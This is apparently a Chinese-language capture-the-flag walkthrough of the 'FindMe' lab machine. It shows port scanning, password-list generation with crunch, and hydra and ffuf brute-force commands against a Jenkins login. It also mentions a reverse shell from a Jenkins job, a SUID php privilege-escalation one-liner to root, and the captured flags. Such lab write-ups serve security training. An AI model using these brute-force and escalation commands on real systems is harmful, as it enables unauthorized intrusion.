# FindMe

2025.03.05 https://thehackerslabs.com/find-me/

## Ip

192.168.5.40

## Scan

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

ftp 可匿名，读取 ayuda.txt , 提示用户名 geralt ，jenkins 的密码包含 5 个字符，以 p 开头，以 a 结尾。

访问 80web 上无信息，8080 web 显示 jenkins，根据上面提示生成密码，爆破（注意要加 C=/login，否则没有 cookie 爆破一直不成功）：

```
crunch 5 5 -t p@@@a -o pass.txt
crunch 5 5 -f /usr/share/crunch/charset.lst mixalpha-numeric -t p@@@a -o pass.txt  # 这个密码字典更大更全，先用上面的小写字母生成，爆不出来再用这个
```

```
hydra -l geralt -P pass 192.168.5.40 -s 8080 http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=:C=/login:F=Invalid username or password" -f
[8080][http-post-form] host: 192.168.5.40   login: geralt   password: panda
```

或者使用 ffuf 进行爆破：

```
ffuf -c -X POST -w pass -u http://192.168.5.40:8080/j_spring_security_check -H 'Content-Type: application/x-www-form-urlencoded'  -d 'j_username=geralt&j_password=FUZZ&from=%2F&Submit=' -fr 'loginError'
```

先将请求用 BP 拦截，保存到文件中 req.txt：

```
POST /j_spring_security_check HTTP/1.1
Host: 192.168.5.40:8080
Content-Length: 42
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.5.40:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.5.40:8080/login?from=%2F
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID.2665f1e3=node01pmqddxyq7z2w1ubxf6ku9eroy169554.node0
Connection: close

j_username=geralt&j_password=FUZZ&from=%2F&Submit=
```

然后进行爆破，同样可以得到账户的密码：

```
ffuf -ac -request req.txt -request-proto http -w pass -t 100
ffuf -c -request req.txt -request-proto http -w pass -t 100 -fr 'loginError'
或
ffuf -c -request req.txt -request-proto http -w pass -t 100 -fr '.*loginError.*'
```

爆出密码 panda，登陆 jenkins。创建 item，执行反弹 shell 到 kali 上：

```
jenkins@find-me:~/workspace/shell$ id
id
uid=104(jenkins) gid=110(jenkins) grupos=110(jenkins)
```

发现 suid /usr/bin/php8.2

```
/usr/bin/php8.2 -r "posix_setuid(0); system('/bin/bash');"
```

直接拿到 root 权限，获得 flag：

```
root@find-me:/home/geralt# cat user.txt
be336806b564e9fd7812aef123f80b7b
root@find-me:/home/geralt# cat /root/root.txt
71b5a461e7df11a40f29c707a8b1b05f
```
